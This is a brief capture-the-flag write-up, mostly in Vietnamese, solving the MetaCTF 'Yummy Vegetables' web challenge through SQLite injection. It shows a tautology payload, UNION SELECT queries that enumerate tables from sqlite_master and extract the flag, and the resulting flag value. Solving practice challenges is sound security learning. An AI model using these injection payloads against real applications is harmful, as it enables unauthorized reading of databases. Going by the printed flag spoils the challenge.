### Yummy Vegetables - web challenge - 300

Challenge description

```
I love me my vegetables, but I can never remember what color they are! I know lots of people have this problem, so I made a site to help.

Here's some sauce to go with the vegetables: index.js
```

http://host.cg21.metaproblems.com:4010/

**Overview** 

Sau click vào liên kết sẽ đưa chúng ta đến với một box tìm kiếm `Search for Vegetables`.  Không có gì khác ngoài việc thử bất cứ thứ gì liên quan đến SQL injection. Sử dụng `' or 1=1--`  mình thấy có list 2 cột hiện ra là `Vegetable Name` và  `Color`. 

Sau khi thực hiện một vài truy vấn tìm số cột và tên dbms mà thử thách dùng là sqlite, truy vấn sau để liệt kê tên table `'  union SELECT null,null,tbl_name FROM sqlite_master --` 

```
Color

sqlite_sequence
the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5
veggies
```

Bảng `the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5` có dấu hiệu là bảng chứa thông tin flag. Tiếng hành truy xuất dữ liệu trong bảng xem kết quả có khả quan không

```
{"query":"' union select null,null,flag from the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5--"}
```

Kết quả flag trong phản hồi http.

```
{
"id":null,
"name":null,
"color":"MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}"
},
```

